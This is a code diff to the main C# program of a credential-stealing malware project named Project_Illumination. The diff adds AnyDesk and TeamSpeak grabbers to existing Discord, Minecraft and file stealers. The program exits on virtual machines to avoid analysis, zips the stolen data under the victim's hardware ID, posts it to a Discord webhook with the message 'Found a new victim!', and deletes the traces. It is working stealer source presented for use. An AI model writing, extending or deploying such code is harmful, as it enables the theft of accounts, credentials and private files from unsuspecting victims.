@@ -8,27 +8,42 @@ using System.IO.Compression;
 using System.Linq;
 using System.Net.Http;
 using System.Threading;
+using System.Windows.Forms;
+using Project_Illumination.Exploits.General;
 
 namespace Project_Illumination
 {
     internal class Program
     {
         // Add as many Webhooks as you want
-        private static readonly string[] _WEBHOOKS = { "1", "2" };
+        private static readonly string[] _WEBHOOKS = { "" };
+        public static readonly bool _DEBUG = false;
+        private static SystemInfo _systemInfo;
 
-        private static void Main(string[] args)
+        public static void Main(string[] args)
         {
-            if (IsVM()) return;
+            if (_DEBUG) return;
+            if (IsVM())
+            {
+                Application.Exit();
+                return;
+            }
 
+            if (Directory.Exists(Paths.SAVE_PATH)) Directory.Delete(Paths.SAVE_PATH, true);
             Directory.CreateDirectory(Paths.SAVE_PATH);
+
             var threads = new List<Thread>
             {
                 new Thread(() =>
                 {
-                    new SystemInfo().Run();
+                    _systemInfo = new SystemInfo();
+                    _systemInfo.Run();
+
                     new DiscordGrabber().Run();
                     new MinecraftStealer().Run();
                     new FileFinder().Run();
+                    new AnyDesk().Run();
+                    new TeamSpeak().Run();
                 })
             };
 
@@ -38,19 +53,23 @@ namespace Project_Illumination
             foreach (var t in threads) t.Start();
             foreach (var t in threads) t.Join();
 
-            if (File.Exists($"{Paths.SAVE_PATH}.zip")) File.Delete($"{Paths.SAVE_PATH}.zip");
+            var fileName = _systemInfo.HWID != "Unknown." ? _systemInfo.HWID : DateTime.Now.ToString("dd_MM_yyyy_HH_mm");
+            if (File.Exists($@"{Paths.TMP}\{fileName}.zip")) File.Delete($@"{Paths.TMP}\{fileName}.zip");
 
-            ZipFile.CreateFromDirectory(Paths.SAVE_PATH, $"{Paths.SAVE_PATH}.zip");
+            ZipFile.CreateFromDirectory(Paths.SAVE_PATH, $@"{Paths.TMP}\{fileName}.zip");
             Directory.Delete(Paths.SAVE_PATH, true);
 
-            using var httpClient = new HttpClient();
-            using var form = new MultipartFormDataContent();
-            var bytes = File.ReadAllBytes($"{Paths.SAVE_PATH}.zip");
+            using var httpClient = new HttpClient {Timeout = TimeSpan.FromSeconds(10)};
 
-            form.Add(new ByteArrayContent(bytes, 0, bytes.Length), "New Victim", $"{Paths.SAVE_PATH}.zip");
+            using var form = new MultipartFormDataContent();
+            var bytes = File.ReadAllBytes($@"{Paths.TMP}\{fileName}.zip");
+
+            form.Add(new StringContent("@everyone **Found a new victim! Here is some mystery package for you.**"), "content");
+            form.Add(new ByteArrayContent(bytes, 0, bytes.Length), "file", $@"{Paths.TMP}\{fileName}.zip");
             httpClient.PostAsync(_WEBHOOKS[new Random().Next(_WEBHOOKS.Length)], form).Wait();
 
-            File.Delete(Paths.SAVE_PATH + ".zip");
+            File.Delete($@"{Paths.TMP}\{fileName}.zip");
+            Paths.DisposePaths();
         }
 
         private static bool IsVM()
